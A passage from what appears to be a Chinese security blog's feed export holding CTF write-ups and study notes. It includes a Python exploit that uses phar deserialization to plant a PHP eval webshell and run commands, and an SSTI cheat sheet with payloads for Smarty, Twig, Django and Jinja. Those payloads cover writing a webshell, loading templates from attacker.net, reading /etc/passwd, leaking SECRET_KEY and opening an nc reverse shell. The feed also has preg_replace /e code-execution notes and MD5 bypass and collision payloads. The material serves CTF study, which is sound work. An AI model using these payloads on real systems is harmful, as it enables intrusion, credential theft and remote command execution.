keyword">return</span> <span class="token builtin">str</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] upload pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phar_trigger</span><span class="token punctuation">(</span>upurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?var[template][1]=phar://"</span><span class="token operator">+</span>upurl<span class="token operator">+</span><span class="token string">"&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?>"</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shell file ----> "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".php"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        shellurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> shellurl    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] trigger pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"gyy"</span> <span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"system('/readflag');"</span>    phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    upurl <span class="token operator">=</span> up_phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shellurl <span class="token operator">=</span> phar_trigger<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shell<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre><hr><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><hr><h4 id="马老师的秘籍"><a href="#马老师的秘籍" class="headerlink" title="马老师的秘籍"></a>马老师的秘籍</h4><p>签到题</p><img src="/article/dasctf2020/image-20201228193732975.png" class="" title="image-20201228193732975" loading="lazy"><p>首先拿到一张图片，随便扫了一个，竟然是招式名称…不过既然是题目，图片肯定不止是图片…用十六进制查看，底部发现了zip标志头<code>50 4D 03 04</code></p><img src="/article/dasctf2020/image-20201228193923701.png" class="" title="image-20201228193923701" loading="lazy"><p>用foremost提前或者直接拖到最后新建十六进制文件搞出来，是个压缩包</p><img src="/article/dasctf2020/image-20201228194027067.png" class="" title="image-20201228194027067" loading="lazy"><p>有加密，所以检查一下，发现有伪加密，直接修改加密位拖出来jpg文件，其他两个是真加密</p><img src="/article/dasctf2020/image-20201228194144848.png" class="" title="image-20201228194144848" loading="lazy"><p>图片很花，不过依稀能看出来东西的</p><img src="/article/dasctf2020/image-20201228194307542.png" class="" title="image-20201228194307542" loading="lazy"><p>所以利用Stegsolve，把这张和原图异或一下即可</p><img src="/article/dasctf2020/image-20201228194456072.png" class="" title="image-20201228194456072" loading="lazy"><p><code>md5(NianQingRenBuJiangWuDe)</code></p><p>那这串去解密真加密文件<code>c57988283c92f759585a0c1aebfdd743</code>，密码正确。</p><p>这里有人说明文攻击也行…没跑过，大概可以吧。</p><p>文本文件里一堆<code>左正蹬 右鞭腿 左刺拳</code>，第二个里面</p><pre class="language-none"><code class="language-none">左正蹬 -&gt; .右鞭腿 -&gt; !左刺拳 -&gt; ?</code></pre><p>很显然，替换。替换完后只有<code>.!?</code>，推测为Ook!加密，直接去解，得到flag</p><img src="/article/dasctf2020/image-20201228195508111.png" class="" title="image-20201228195508111" loading="lazy"><hr><h4 id="FakePic"><a href="#FakePic" class="headerlink" title="FakePic"></a>FakePic</h4><p>RAR压缩包注释提示密码为1???小写字母，共四位</p><img src="/article/dasctf2020/image-20201228195736671.png" class="" title="image-20201228195736671" loading="lazy"><p>输出个字典用ARPA准备跑，结果提示这不是个RAR文件，则为RAR5格式，利用hashcat破解，得到密码<code>1cpp</code></p><p>解压后一个图片一个提示</p><pre class="language-none"><code class="language-none">10132430取最前面500位就行</code></pre><p>Stegsolve分析一波无果，提示也一头雾水。最后在十六进制查看在文件末尾时发现提示</p><img src="/article/dasctf2020/image-20201228195943508.png" class="" title="image-20201228195943508" loading="lazy"><p>分析到这没做了，电脑有问题没装上PIL模块。</p><p>赛后参考<a href="https://l1near.top/index.php/2020/12/27/87.html">大师傅博客</a>，利用脚本跑出Alpha通道前几个点，发现</p><img src="/article/dasctf2020/image-20201228203355447.png" class="" title="image-20201228203355447" loading="lazy"><p> 都是2的倍数，且倍数都不大。结合前面的提示（而且提示的长度还为8）。那么就猜测提示的作用是这样的：<code>10132430</code>得这样分<code>1 0 1 3 2 4 3 0</code>，然后这8个为一轮一直循环。如果刚好轮到这个数，算出来的<code>pow(2,x)</code>和Alpha通道的值一样，那么就为1，否则就为0。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>width<span class="token punctuation">,</span>height <span class="token operator">=</span> pic<span class="token punctuation">.</span>sizeflag <span class="token operator">=</span> <span class="token string">""</span>z <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>i <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> z <span class="token operator">&lt;=</span> <span class="token number">500</span><span class="token punctuation">:</span>            z <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span>z <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pic<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'1'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'0'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>跑出来<codecode></p><p>去二进制转字符串，得到flag</p><img src="/article/dasctf2020/image-20201228203737416.png" class="" title="image-20201228203737416" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了，有些点还是比较生疏，重点学习了一波phar反序列化，继续学习。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="article/ssti/"/>
      <url>article/ssti/</url>
      
        <content type="html"><![CDATA[<p>SSTI模板注入</p><span id="more"></span><h1 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h1><h2 id="什么是模板注入"><a href="#什么是模板注入" class="headerlink" title="什么是模板注入"></a>什么是模板注入</h2><p> SSTI （服务器端模板注入）也是格式化字符串的一个非常好的例子，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是。这种模板不仅存于Python中，PHP中也有不少模板引擎。</p><h2 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h2><img src="/article/ssti/SSTI%E6%B5%81%E7%A8%8B.png" class="" title="SSTI流程" loading="lazy"><p>首先输入<code>&#123;&#123;7*7&#125;&#125;</code>，返回值为<code>49</code>则表明存在SSTI</p><p>输入<code>&#123;&#123;system('cat /etc/passwd')&#125;&#125;</code>如果返回值则表明为<strong>Smarty模板引擎</strong></p><p>输入<code>&#123;&#123;7*'7'&#125;&#125;</code>如果返回值是<code>49</code>则为<strong>Twig模板引擎</strong></p><p>如果返回值是<code>7777777</code>则为<strong>JinJa模板引擎</strong></p><hr><h2 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payload：</p><pre class="language-none"><code class="language-none">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;&#123;literal&#125;alert(&#39;xss&#39;);&#123;&#x2F;literal&#125;&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</code></pre><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;etc&#x2F;passwd&quot;)&#125;&#125;&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat &#x2F;etc&#x2F;passwd&quot;) &#125;</code></pre><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</code></pre><h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;&#x2F;&#x2F;写文件&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;&#x2F;&#x2F;加载system&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;&#x2F;&#x2F;执行命令反弹SHELL</code></pre><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:port&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_replace与代码执行</title>
      <link href="article/preg_replace/"/>
      <url>article/preg_replace/</url>
      
        <content type="html"><![CDATA[<p>参考文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p><span id="more"></span><h1 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h1><p> <strong>preg_replace</strong> <strong>&#x2F;e</strong> 模式下的代码执行问题 </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p> <strong>preg_replace</strong> 使用了 <strong>&#x2F;e</strong> 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。 </p><p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串.</p><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。</p><blockquote><p><strong>反向引用</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p> <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>&#x2F;?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。 </p><pre class="language-none"><code class="language-none">$re&#x3D;.*$str&#x3D;&#123;$&#123;phpinfo()&#125;&#125;原先的语句： preg_replace(&#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $str);变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;phpinfo()&#125;&#125;);</code></pre><hr><p> 由于在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。 </p><p> 当非法字符为首字母时，只有点号会被替换成下划线，所以我们要做的就是换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行 <strong>phpinfo</strong> 函数。<strong>payload</strong> ： <strong>\S*&#x3D;${phpinfo()}</strong> </p><p> 为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。 </p><p>文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5比较</title>
      <link href="article/md5/"/>
      <url>article/md5/</url>
      
        <content type="html"><![CDATA[<p>MD5弱类型比较，强类型比较以及真实碰撞</p><span id="more"></span><h1 id="MD5比较类型"><a href="#MD5比较类型" class="headerlink" title="MD5比较类型"></a>MD5比较类型</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>弱类型比较因为php特性，0e开头会被识别为科学计数法，结果0&#x3D;0比较成功</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>aabg7XSs</code></pre><p>只要是md5值为0e开头即可</p><hr><h2 id="强比较类型"><a href="#强比较类型" class="headerlink" title="强比较类型"></a>强比较类型</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>强类型比较用数组绕过，md5()函数无法解出其数值，就会得到&#x3D;&#x3D;&#x3D;强比较值相等</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">111</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaa</code></pre><p>传入数组即可</p><hr><h2 id="真实碰撞"><a href="#真实碰撞" class="headerlink" title="真实碰撞"></a>真实碰撞</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2</code></pre><p>值不等，md5相等即可。md5碰撞。</p><hr><h2 id="0e开头MD5的MD5为0e的MD5"><a href="#0e开头MD5的MD5为0e的MD5" class="headerlink" title="0e开头MD5的MD5为0e的MD5"></a>0e开头MD5的MD5为0e的MD5</h2><p>0e215962017 </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>S3cCTF-出题人gyy-Writeup</title>
      <link href="article/S3cCTF-gyy-Writeup/"/>
      <url>article/S3cCTF-gyy-Writeup/</url>
      
